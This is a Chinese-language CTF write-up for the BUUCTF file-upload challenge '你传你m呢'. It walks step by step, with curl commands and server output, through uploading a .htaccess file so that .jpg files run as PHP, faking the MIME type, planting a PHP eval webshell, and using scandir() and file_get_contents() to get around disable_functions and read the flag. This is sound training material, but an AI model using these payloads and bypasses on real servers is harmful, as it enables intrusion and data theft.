# BUUCTF - 你传你m呢 (文件上传漏洞) Writeup

## 题目背景

题目名"是兄弟就来传🐎" / "你传你m呢"，考察文件上传漏洞的黑名单绕过、`.htaccess` 解析规则篡改、MIME 类型伪造，以及 `disable_functions` 绕过。

## 目标网址

```
http://db6e997b-1b79-49dc-b771-3ec16052b7a6.node5.buuoj.cn:81/
```

![](assets/11-你传你m呢-deepseek/file-20260503031433850.png)
## 解题过程

### 1. 信息收集 — 访问首页

```bash
curl -s -i "http://db6e997b-1b79-49dc-b771-3ec16052b7a6.node5.buuoj.cn:81/"
```

返回的关键信息：
- 服务器：`openresty`（基于 Nginx）
- `X-Powered-By: PHP/5.6.23`
- HTML 中包含 `<form action="upload.php" method="post" enctype="multipart/form-data">`
- 上传字段名为 `uploaded`，提交按钮名为 `submit`，值为"一键去世"
- 设置了 `PHPSESSID` Cookie

```html
<form action="upload.php" method="post" enctype="multipart/form-data">
<input type="file" name="uploaded" />
<br/>
<input type="submit" name="submit" value="一键去世" />
</form>
```

### 2. 思路分析

```bash
curl -s -i -X POST \
-F "uploaded=@./tmp/test.php" \
-F "submit=一键去世" \
http://2cb52a5e-82ad-4545-9424-d2f2c217d16a.node5.buuoj.cn:81/upload.php
```

直接上传 `.php` 文件会被后端黑名单拦截（返回"我扌your problem?"）。本题的绕过思路：

1. 上传 `.htaccess` 文件，添加 `AddType application/x-httpd-php .jpg`，让 Apache 将 `.jpg` 当作 PHP 执行
2. 上传含 PHP 代码的 `.jpg` 文件（一句话木马）
3. PHP 的 `system()` 等危险函数被禁用（`disable_functions`），使用 `scandir()` + `file_get_contents()` 替代

> **注意**：虽然服务器前面有 openresty (Nginx) 做反向代理，但后端 PHP 运行在 Apache 上，所以 `.htaccess` 仍然生效。

### 3. 制作 Payload

创建 payload 文件：

```bash
mkdir -p /tmp/ctf_upload

# .htaccess：修改 Apache 解析规则，让 .jpg 被当作 PHP 执行
cat > /tmp/ctf_upload/.htaccess << 'EOF'
AddType application/x-httpd-php .jpg
EOF

# shell.jpg：PHP 一句话木马
cat > /tmp/ctf_upload/shell.jpg << 'EOF'
<?php eval($_POST['cmd']); ?>
EOF
```

### 4. 上传 .htaccess（绕过 MIME 类型检查）

```bash
curl -s -i -X POST \
  -F "uploaded=@/tmp/ctf_upload/.htaccess;type=image/jpeg" \
  -F "submit=一键去世" \
  "http://db6e997b-1b79-49dc-b771-3ec16052b7a6.node5.buuoj.cn:81/upload.php"
```

关键点：
- `type=image/jpeg` 伪造 Content-Type 为 `image/jpeg`，绕过服务端对 MIME 类型的校验
- 如果 `PHPSESSID` 变了，后续请求要带上新的 session cookie

返回：

```shell
HTTP/1.1 200 OK
Server: openresty
Date: Thu, 30 Apr 2026 16:19:58 GMT
Content-Type: text/html
Content-Length: 109
Connection: keep-alive
X-Powered-By: PHP/5.6.23
Set-Cookie: PHPSESSID=853301e998fbc46d47aa6cabf598b7e6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Cache-Control: no-cache


<meta charset="utf-8">/var/www/html/upload/774e095560a299b7955ba19fc12e6cdf/.htaccess succesfully uploaded!%     
```



```
/var/www/html/upload/049d070cfef61727b914b055dda1a3b5/.htaccess succesfully uploaded!
```

服务端根据 session 创建了一个随机目录 `049d070cfef61727b914b055dda1a3b5` 存放上传文件。

### 5. 上传 PHP 木马（伪装为 jpg）

```bash
curl -s -i -X POST \
  -F "uploaded=@/tmp/ctf_upload/shell.jpg;type=image/jpeg" \
  -F "submit=一键去世" \
  -b "PHPSESSID=ea940d8225d176f2f7ec0988382f85d2" \
  "http://db6e997b-1b79-49dc-b771-3ec16052b7a6.node5.buuoj.cn:81/upload.php"
```

> 带上 `PHPSESSID` cookie 确保文件上传到同一个目录。

返回：
```
/var/www/html/upload/049d070cfef61727b914b055dda1a3b5/shell.jpg succesfully uploaded!
```

### 6. 使用 Webshell 获取 Flag

#### 6.1 确认 disable_functions — 测试命令执行函数

拿到 shell 后，首先尝试最直接的方法——命令执行函数。逐一测试 `system()`, `exec()`, `shell_exec()`, `passthru()`：

```bash
# 测试 system()
curl -s -X POST \
  -d "cmd=system('id');" \
  "http://TARGET/upload/UPLOAD_DIR/shell.jpg"

# 测试 exec()
curl -s -X POST \
  -d "cmd=exec('id');" \
  "http://TARGET/upload/UPLOAD_DIR/shell.jpg"

# 测试 shell_exec()
curl -s -X POST \
  -d "cmd=echo shell_exec('id');" \
  "http://TARGET/upload/UPLOAD_DIR/shell.jpg"

# 测试 passthru()
curl -s -X POST \
  -d "cmd=passthru('id');" \
  "http://TARGET/upload/UPLOAD_DIR/shell.jpg"
```

四个函数均返回同样的错误：

```
Warning: system() has been disabled for security reasons in
/var/www/html/upload/.../shell.jpg(1) : eval()'d code on line 1

Warning: exec() has been disabled for security reasons in ...

Warning: shell_exec() has been disabled for security reasons in ...

Warning: passthru() has been disabled for security reasons in ...
```

**结论**：`disable_functions` 禁用了 `system`, `exec`, `shell_exec`, `passthru` 等命令执行函数。需要切换到 PHP 内置函数。

#### 6.2 使用 PHP 内置函数 — scandir() 列目录

```bash
curl -s -X POST \
  -d "cmd=var_dump(scandir('/'));" \
  "http://TARGET/upload/UPLOAD_DIR/shell.jpg"
```

成功返回根目录列表，`scandir()` 不受 `disable_functions` 限制：

```
array(24) {
  ...
  [8]=> string(4) "flag"
  ...
}
```

在根目录发现 `flag` 文件。对比上面 `system()` 系列函数直接报 warning 被拦截，`scandir()` 正常工作——说明 `disable_functions` 只禁命令执行，不禁文件操作。

#### 6.3 读取 flag — file_get_contents()

```bash
curl -s -X POST \
  -d "cmd=var_dump(file_get_contents('/flag'));" \
  "http://TARGET/upload/UPLOAD_DIR/shell.jpg"
```

返回：

```
string(43) "flag{894f60ad-5c15-49a1-b5d9-0c2a1738c992}"
```

## Flag

```
flag{894f60ad-5c15-49a1-b5d9-0c2a1738c992}
```

## 知识点总结

### 1. 文件上传黑名单绕过

后端对文件后缀做了黑名单过滤，拦截 `php`/`php5`/`phtml` 等常见 PHP 后缀。但 `.htaccess` 不在黑名单中（或未被过滤），从而可以利用 Apache 的配置覆盖机制。

### 2. MIME 类型伪造

`curl -F` 上传时通过 `;type=image/jpeg` 设置 Content-Type，绕过服务端对上传文件 MIME 类型的校验。服务端可能通过 `$_FILES['uploaded']['type']` 检查是否为图片类型。

### 3. .htaccess 修改解析规则

在 Apache 环境下，若 `AllowOverride` 允许（本题中允许了），可通过 `.htaccess` 文件覆盖目录配置：

```htaccess
AddType application/x-httpd-php .jpg
```

这行配置使得 `.jpg` 文件被当作 PHP 脚本解析执行，从而绕过后缀名限制。

> **扩展**：其他常见 `.htaccess` 利用方式还包括：
> - `AddHandler application/x-httpd-php .jpg`
> - `SetHandler application/x-httpd-php`
> - 利用 `php_value auto_prepend_file` 包含恶意代码

### 4. disable_functions 绕过

PHP 的 `disable_functions` 禁用了 `system`/`exec`/`passthru`/`shell_exec` 等命令执行函数，但 PHP 内置的文件操作函数不受影响：

| 功能 | 禁用 | 替代方案 |
|------|------|---------|
| 执行命令 | `system()` / `exec()` | ❌ 不可用 |
| 列目录 | — | `scandir()` |
| 读文件 | — | `file_get_contents()` |
| 输出变量 | — | `var_dump()` / `print_r()` |

> **延伸**：在更严格的环境中，`scandir()` 也可能被禁用。此时还可以考虑：
> - `glob()` 遍历目录
> - `DirectoryIterator` 类
> - `opendir()` + `readdir()` + `closedir()`

### 5. Session 与上传目录关联

本题根据 `PHPSESSID` 创建独立的随机上传目录，需要保持 session 一致性（通过 `-b` 传递 cookie），否则 `.htaccess` 和 shell 会上传到不同目录，导致 `.htaccess` 规则不生效。

### 6. 完整攻击链

```
黑名单过滤 .php → 上传 .htaccess 修改解析规则 → 伪造 Content-Type 绕过 MIME 检查
→ 上传 .jpg 木马 → disable_functions 禁用命令执行 → scandir() + file_get_contents() 读取 flag
```

## 思路推导详解

以下是每一步的推导逻辑——遇到阻碍 → 分析原因 → 寻找绕过方法。

### 第 0 步：看到题目，确定方向

题目名"你传你m呢"——"你传你🐎呢"，其中"🐎"在 CTF 圈是"木马"的谐音梗（🐎 = 马 = 木马，源自中文输入法"muma"）。题目直接告诉你：这是一道**文件上传漏洞**题，目标是传马 getshell。

访问首页，HTML 里只有一个 `<form action="upload.php">`，进一步确认了这点。

### 第 1 步：为什么想到 `.htaccess`？

这是一个**排除法 + Apache 特性**的推导过程。

**① 直接上传 `.php` → 被拦截**

如果直接传 `shell.php`，服务器返回"我扌your problem?"。说明有**后缀名黑名单**。常见黑名单会拦截：`php`, `php5`, `phtml`, `pht`, `php3`, `php4`, `php7` 等。

**② 常见的绕过手法，逐一评估：**

| 手法 | 可行性 |
|------|:-------|
| 改后缀为 `.php5` / `.phtml` | ❌ 一般在黑名单里 |
| 双写后缀 `.php.jpg` | ❌ 需要 Apache 配置 `AddHandler` 按顺序解析，本题没有 |
| 大小写 `.Php` / `.PHp` | ❌ 服务器通常是 `strtolower()` 处理 |
| 加空格/点 `.php.` / `.php ` | ❌ 本题似乎会去掉特殊字符 |
| `%00` 截断 | ❌ PHP 5.3.4+ 已修复，本题 PHP 5.6 |
| **`.htaccess` 覆盖配置** | ✅ Apache 经典特性，且 `.htaccess` 一般不加入黑名单 |
| `.user.ini` 包含 | ⚠️ 可行但不如 `.htaccess` 直接，且本题验证了 `.htaccess` 可行 |

**③ `.htaccess` 为什么是首选？**

`.htaccess` 是 Apache 的目录级配置文件。如果服务端是 Apache（或 Nginx 反代 Apache），并且 `AllowOverride` 开启了，上传一个 `.htaccess` 就能**从源头改变解析规则**——让服务器把 `.jpg` 当 PHP 执行。这个文件后缀本身不在 PHP 脚本黑名单中，拦截概率低。

**关键判断依据**：页面标题"是兄弟就来传🐎"暗示了这是经典的 Apache 上传题，`.htaccess` 是这类题的标准起手式。

### 第 2 步：为什么要伪造 `Content-Type: image/jpeg`？

这是**对"上传检测逻辑"的提前预判**：

既然题目做了后缀名黑名单，大概率也做了 **MIME 类型检测**——即检查 `$_FILES['uploaded']['type']` 是否为允许的类型（如 `image/jpeg`、`image/png`）。

curl 的 `-F` 参数默认会根据文件后缀设置 Content-Type：
- `.htaccess` → `text/plain` 或 `application/octet-stream`
- `.php` → `application/x-httpd-php`

如果直接上传 `.htaccess` 而不指定 `type=`，MIME 类型会暴露这不是图片，可能被拦截。所以：

```bash
-F "uploaded=@file;type=image/jpeg"
```

**这是主动加的防御性措施**——先假设有 MIME 检查，用最小成本绕过它。即使题目没检查，加了也不会出错。

### 第 3 步：为什么要用 Session Cookie？

上传 `.htaccess` 后，服务器返回：
```
/var/www/html/upload/049d070cfef61727b914b055dda1a3b5/.htaccess succesfully uploaded!
```

返回的是**完整绝对路径**，且路径中有一个**随机哈希** `049d070cfef61727b914b055dda1a3b5`。

**推导**：这个随机字符串怎么来的？观察服务器的 `Set-Cookie: PHPSESSID=...`，推测：

> 服务端为每个 session 创建独立的上传目录。如果两次上传的 session 不同，`.htaccess` 和 `shell.jpg` 就会落在不同目录，`.htaccess` 的规则就不会应用到 `shell.jpg` 上。

所以第二次上传必须带上相同的 cookie：
```bash
-b "PHPSESSID=ea940d8225d176f2f7ec0988382f85d2"
```

### 第 4 步：为什么用 `scandir() + file_get_contents()` 而不是 `system()`？

这是一句话木马 `<?php eval($_POST['cmd']); ?>` 执行后**遇到障碍的应急调整**。

拿到 shell 后的第一反应是用命令执行函数直接读 flag。逐一测试：

```bash
# 测试 system()
curl -s -X POST -d "cmd=system('id');" "http://TARGET/upload/.../shell.jpg"
# 返回：
# Warning: system() has been disabled for security reasons in
# /var/www/html/upload/.../shell.jpg(1) : eval()'d code on line 1

# 测试 exec()
curl -s -X POST -d "cmd=exec('id');" "http://TARGET/upload/.../shell.jpg"
# 返回：
# Warning: exec() has been disabled for security reasons in ...

# 测试 shell_exec()
curl -s -X POST -d "cmd=echo shell_exec('id');" "http://TARGET/upload/.../shell.jpg"
# 返回：
# Warning: shell_exec() has been disabled for security reasons in ...

# 测试 passthru()
curl -s -X POST -d "cmd=passthru('id');" "http://TARGET/upload/.../shell.jpg"
# 返回：
# Warning: passthru() has been disabled for security reasons in ...
```

四个函数全部被 `disable_functions` 拦截，直接返回 Warning。

**替代方案推导**：

> 命令执行函数被禁 ≠ 所有 PHP 函数被禁。`eval()` 可以执行任意 PHP 代码 →
> 读文件可以用 `file_get_contents()` → 列目录可以用 `scandir()` →
> 输出用 `var_dump()` 直接打印到响应体。

对比验证——`scandir()` 确实不受影响：

```bash
# 命令执行：被禁
curl -s -X POST -d "cmd=system('ls /');" "http://TARGET/upload/.../shell.jpg"
# Warning: system() has been disabled for security reasons

# PHP 内置函数：正常工作
curl -s -X POST -d "cmd=var_dump(scandir('/'));" "http://TARGET/upload/.../shell.jpg"
# array(24) { ... [8]=> string(4) "flag" ... }
```

这就是 payload 从 `system('ls /')` → `var_dump(scandir('/'))` → `var_dump(file_get_contents('/flag'))` 的推导链。

### 总结：完整的推导链

```
题目名"你传你m呢"
  → 文件上传题，目标是传马
  → 直接传 .php 被拦（黑名单）
  → 需要绕过：
      ├─ 后缀绕过：.htaccess 改解析规则 (Apache 特性)
      ├─ MIME 绕过：type=image/jpeg (预判检测逻辑)
      └─ Session 一致性：-b PHPSESSID (观察路径包含 session hash)
  → 一句话木马上线
  → system() 被禁
  → 降级为 PHP 内置函数：scandir() + file_get_contents()
  → /flag → flag{}
```

每一步都不是凭空想的，而是**前一步遇到阻碍 → 分析阻碍原因 → 寻找对应绕过方法**的链式推导。
